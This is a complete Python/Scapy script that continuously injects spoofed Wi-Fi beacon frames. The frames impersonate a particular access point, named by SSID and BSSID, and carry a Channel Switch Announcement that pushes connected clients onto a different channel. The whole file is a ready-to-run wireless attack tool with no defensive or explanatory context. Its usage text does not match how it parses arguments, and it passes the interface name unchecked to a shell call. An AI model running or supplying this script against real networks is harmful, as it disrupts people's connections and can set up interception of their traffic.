#!/usr/bin/env python3
"""Continuous CSA beacon injection.
Usage: python3 csa_inject_continuous.py <interface> [bssid] [target_ch]

Default: EPCOT B4:FB:E4:47:98:BF ch1 -> ch6 on wlan2
"""

from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, RadioTap
import time, sys, os

BSSID = sys.argv[2] if len(sys.argv) > 2 else 'b4:fb:e4:47:98:bf'
SSID = sys.argv[3] if len(sys.argv) > 3 else 'EPCOT'
CURRENT_CH = int(sys.argv[4]) if len(sys.argv) > 4 else 1
TARGET_CH = int(sys.argv[5]) if len(sys.argv) > 5 else 6
IFACE = sys.argv[1] if len(sys.argv) > 1 else 'wlan2'
SWITCH_COUNT = 2  # beacons before switch (~200ms at 100ms BI)

os.system(f'iw dev {IFACE} set channel {CURRENT_CH}')

# CSA IE: tag 37 (0x25), len 3, switch_mode=1, new_ch, count
csa = Dot11Elt(ID=37, info=bytes([0x01, TARGET_CH, SWITCH_COUNT]))

# Build beacon with key IEs
dot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2=BSSID, addr3=BSSID)
beacon = Dot11Beacon(cap='ESS+privacy')
essid = Dot11Elt(ID='SSID', info=SSID.encode())
rates = Dot11Elt(ID='Rates', info=b'\x82\x84\x8b\x96\x0c\x12\x18\x24')
dsss = Dot11Elt(ID='DSset', info=bytes([CURRENT_CH]))
rsn = Dot11Elt(ID=48, info=b'\x01\x00\x00\x0f\xac\x04\x01\x00\x00\x0f\xac\x04\x01\x00\x00\x0f\xac\x02\x00\x00')

frame = RadioTap() / dot11 / beacon / essid / rates / dsss / rsn / csa

print(f'CSA inject: {SSID} ({BSSID}) ch{CURRENT_CH} -> ch{TARGET_CH} count={SWITCH_COUNT} on {IFACE}')
print(f'Frame: {len(frame)} bytes, 20/sec. Ctrl+C to stop')

count = 0
while True:
    sendp(frame, iface=IFACE, count=1, verbose=False)
    count += 1
    if count % 100 == 0:
        print(f'  Sent {count} CSA beacons')
    time.sleep(0.05)
